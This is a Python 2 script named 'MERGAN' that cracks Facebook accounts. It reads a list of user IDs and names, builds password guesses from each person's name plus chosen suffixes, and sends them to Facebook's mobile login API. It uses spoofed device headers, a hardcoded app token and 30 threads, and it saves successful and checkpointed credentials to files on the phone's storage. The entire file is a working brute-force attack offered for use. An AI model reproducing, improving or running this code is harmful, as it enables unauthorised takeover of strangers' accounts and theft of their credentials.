# coding: utf-8
# aahil writes


try:
    import os,sys,time,platform,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,requests,uuid,string,subprocess
    from multiprocessing.pool import ThreadPool
    from requests.exceptions import ConnectionError
except ImportError:
    os.system("pip2 install requests ")
    os.system("python2 mergan.py")


def t(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

gre='\x1b[1;92m'
red='\x1b[1;91m'
w='\x1b[1;97m'
y='\x1b[1;93m'
n='\x1b[1;94m'
gu='\x1b[1;95m'
sm='\x1b[1;96m'

logo ="""


##     ## ######## ########   ######      ###    ##    ## 
###   ### ##       ##     ## ##    ##    ## ##   ###   ## 
#### #### ##       ##     ## ##         ##   ##  ####  ## 
## ### ## ######   ########  ##   #### ##     ## ## ## ## 
##     ## ##       ##   ##   ##    ##  ######### ##  #### 
##     ## ##       ##    ##  ##    ##  ##     ## ##   ### 
##     ## ######## ##     ##  ######   ##     ## ##    ## 
=========================================================


"""

def sec():
    k=requests.get("https://raw.githubusercontent.com/Rana-Aahil/key/main/pass.txt").text
    os.system("clear")
    print logo
    x=raw_input("Enter Key : ")
    if x in k:
        m3a()
    else:
        print ("Wrong Key")
        time.sleep(2)
        sec()

def m3a():
    idx=[]
    oku=[]
    cpu=[]
    os.system("clear")
    print(logo)
    print("[1] Cloning with name & pass")
    print("[2] Cloning with Passwords")
    print("[B] Back\n")
    x1=raw_input("Choice option : ")
    if x1=="1":
        cat="100"
        os.system("clear")
        print(logo)
        t(sm+"       [ example : 123 12345 786 ]\n"+w)
        p1=raw_input("[1] name + : ")
        p2=raw_input("[2] name + : ")
        p3=raw_input("[3] name + : ")
        p4=raw_input("[4] name + : ")
    elif x1=="2":
        os.system("clear")
        print(logo)
        t(sm+"  [ example : 786786 334455 445566 ]\n"+w)
        p1=raw_input("[1] Password : ")
        p2=raw_input("[2] Password : ")
        p3=raw_input("[3] Password : ")
        p4=raw_input("[4] Password : ")
    elif x1=="B" or "b":
        m3a()
    else:
        print("Enter valid option")
        time.sleep(2)
        m3a()
    print("")
    try:
        myfile=raw_input("[•] File : ")
        for line in open(myfile,'r').readlines():
            idx.append(line.strip())
    except:
        print(red+"Error"+w)
        time.sleep(2)
        m3a()
    os.system("clear")
    print(logo)
    print(w+" Use (airplane) mode if no result \n"+w)
    print("[\x1b[1;92m•\x1b[1;97m] Total ids : "+str(len(idx)))
    print("-------------------------------------")
    print("     The process has started ...."+w)
    print("-------------------------------------")
    def mine(user):
        myid, name=user.split('|')
        first=name.rsplit(' ')[0]
        try:
            last=name.rsplit(' ')[1]
        except:
            last=first
        try:
            if "100" in cat:
                pwx=[first+last,name,first+p1,first+p2,first+p3,first+p4]
        except:
            pwx=[p1,p2,p3,p4]
        agent2=(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]", "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+", "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.11", "nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+", "Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]", "Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36"])
        __users=random.choice(agent2)
        try:
            for pw in pwx:
                pw = pw.lower()
                ses = requests.Session()
                headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": __users, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
                send = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(myid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers_)
                if "session_key" in send.text and "EAAA" in send.text:
                    print(gre+"[SPEED-OK] "+myid+" | "+pw)
                    ok=open("/sdcard/rsa-ok.txt",'a')
                    ok.write(myid+"|"+pw+"\n")
                    ok.close()
                    oku.append(myid+pw)
                    break
                    continue
                elif "www.facebook.com" in send.json()["error_msg"]:
                    print(sm+"[SPEED-CP] "+myid+" | "+pw)
                    cp=open("/sdcard/rsa-cp.txt",'a')
                    cp.write(myid+"|"+pw+"\n")
                    cp.close()
                    cpu.append(myid+pw)
                    break
                    continue
        except:
            pass
    p = ThreadPool(30)
    p.map(mine, idx)
    print(w+"-------------------------------------")
    print('[\x1b[1;92m•\x1b[1;97m] Total ok ids : '+str(len(oku)))
    print('[\x1b[1;92m•\x1b[1;97m] Total cp ids : '+str(len(cpu)))
    print('[\x1b[1;92m•\x1b[1;97m] ok ids save in : /sdcard/rsa-ok.txt')
    print('[\x1b[1;92m•\x1b[1;97m] cp ids save in : /sdcard/rsa-cp.txt')
    print(w+"-------------------------------------")
    raw_input('Press enter to back')
    m3a()

if __name__=='__main__':
    sec()